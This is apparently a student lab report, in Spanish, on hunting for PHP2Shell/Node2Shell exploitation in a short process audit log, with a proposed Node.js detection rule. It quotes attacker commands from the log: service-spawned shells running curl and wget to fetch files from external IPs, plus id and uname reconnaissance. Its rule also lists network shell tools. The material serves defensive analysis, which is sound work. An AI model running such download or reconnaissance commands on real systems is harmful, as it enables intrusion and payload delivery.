# Detección y caza — Grupo 12

**Integrantes:** Facundo Serra, Martin Espamer, Manuel Rebol, Agustín Manrique, Baltazar Molteni · **Fecha:** 28/10/2026

Analizamos `laboratorio/logs/audit.log` (21 líneas, del 27/10/2026 de 09:40 a 09:49 UTC).
Primero lo filtramos con `./scripts/detectar.sh` ([salida](capturas/04-detectar.txt)).

---

## 1. Hipótesis de caza

Si alguien explotó PHP2Shell o Node2Shell, el proceso del servicio (`apache2`, `node`
o `python`) tendría que aparecer como padre de un `sh`, `bash`, `curl` o `wget`,
después del 21/10. Esperamos ver primero comandos para reconocer el sistema (`id`,
`uname`) y después alguna descarga desde una IP externa.

---

## 2. Hallazgos en `audit.log`

Lo normal en el log es que cada servicio lance procesos de su mismo nombre
(`apache2 -k start`, `node server.js`, `python app.py`). Marcamos lo que no sigue eso.

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|---|---|
| 6, 09:42:17 | web01 | `apache2` → `sh -c id` | Sí | El portal no ejecuta comandos. `id` sirve para ver con qué usuario se quedó |
| 7, 09:42:18 | web01 | `sh` → `id` | Sí | Sigue la línea anterior |
| 9, 09:43:03 | api01 | `node` → `sh -c curl http://198.51.100.7/x` | Sí | En `server.js` no hay nada que ejecute comandos. Intenta bajar algo de afuera |
| 10, 09:43:04 | api01 | `sh` → `curl http://198.51.100.7/x` | Sí | Sigue la línea anterior |
| 14, 09:44:22 | web01 | `apache2` → `wget http://198.51.100.9/a` | Sí | Dos minutos después del `id`, ahora descarga algo |
| 16, 09:45:10 | svc01 | `python` → `sh -c uname -a` | Sí | El servicio interno tampoco lanza shells. `uname -a` muestra datos del sistema |
| 17, 09:45:11 | svc01 | `sh` → `uname -a` | Sí | Sigue la línea anterior |
| 8, 13, 21 | db01 | `sshd` → `bash` | Dudoso | Puede ser alguien entrando por SSH a trabajar (ver punto 3) |

El orden en el tiempo es web01, api01, web01 y al final svc01. Primero los dos
servicios que están en Internet y después el interno, como si alguien entrara por
afuera y después se moviera adentro.

**¿Hay compromiso?** Probablemente sí en web01 y api01. En svc01 no se puede saber.
En db01 no vemos nada raro.

Lo que lo apoya: son cuatro cadenas que no tendrían que existir, en tres servidores,
en menos de 3 minutos, con reconocimiento y descargas.

Lo que no sabemos: si `curl` y `wget` llegaron a bajar algo (el log no dice si
funcionaron, y en el lab la red no tiene salida), quién los ejecutó y desde qué IP
vino el pedido. En svc01 hay un solo `uname -a`, que podría ser un script de
diagnóstico.

Lo que haríamos: aislar web01 y api01, guardar los logs, cambiar las contraseñas que
usan y revisar svc01.

---

## 3. Falsos positivos

Las líneas de db01 (`sshd → bash`) parecen sospechosas porque son shells en el
servidor de base de datos en el mismo momento del ataque. Pero `sshd` lanzando
`-bash` es lo que pasa cuando un administrador entra por SSH. El guion adelante de
`bash` indica que es una sesión de login normal.

Para saber si es legítimo habría que ver:

- qué usuario entró (en `auth.log` o `journalctl -u sshd`),
- desde qué IP (si viene de web01 o api01 ya no es un admin, es alguien moviéndose),
- si había alguna tarea o guardia anotada ese día,
- qué comandos corrió después.

El `uname -a` de svc01 también podría ser un falso positivo si algún script lo
corre siempre. Para saberlo habría que ver logs de otros días.

---

## 4. Regla propuesta para Node.js

Mira la creación de procesos (como hace este log; en un servidor real sería con
`auditd`, Falco o el antivirus/EDR).

```
ppid_comm = "node"
AND comm IN ("sh", "bash", "dash", "curl", "wget", "nc", "busybox")
```

Si además los argumentos tienen una URL o una IP, la alerta es más grave.

Esta API no usa `child_process`, así que no hace falta ninguna excepción.

**Falsos negativos que puede tener:**

- Si el atacante hace todo dentro de Node (con `fetch` o `fs`) no se crea ningún
  proceso y la regla no ve nada. Esto lo frena la red sin salida, no la regla.
- Si usa otro programa en el medio, por ejemplo `node → python3 → sh`, el padre de
  `sh` es `python3` y la regla no salta. Habría que mirar toda la cadena de padres.
- Si copia `curl` con otro nombre. En este lab `/tmp` tiene `noexec`, pero en otro
  servidor puede que no.
- En los servidores donde se corre `npm install` es normal que `node` lance `sh`. Ahí
  habría que excluir solo esos servidores.

---

## 5. Limitaciones del log

- No dice qué usuario ejecutó cada proceso.
- No tiene la IP de origen, así que no se puede saber qué pedido HTTP disparó cada
  comando ni de dónde vinieron las sesiones SSH.
- No dice si los comandos funcionaron (no hay código de salida).
- No hay registro de red ni de archivos, así que no podemos saber si se sacaron datos
  o si dejaron algo instalado.
- Son solo 9 minutos de un día. No hay días anteriores para comparar ni sabemos cuánto
  tiempo se guardan los logs.
- Hay mucho ruido de procesos normales que se repiten. En un día completo los casos
  raros quedarían perdidos si no se filtra.
- Si alguien tuviera root en el servidor podría modificar el log. Por eso conviene
  mandarlo a otro lado.

Con este log alcanza para decidir qué aislar, pero no para saber quién fue ni qué se
llevó.
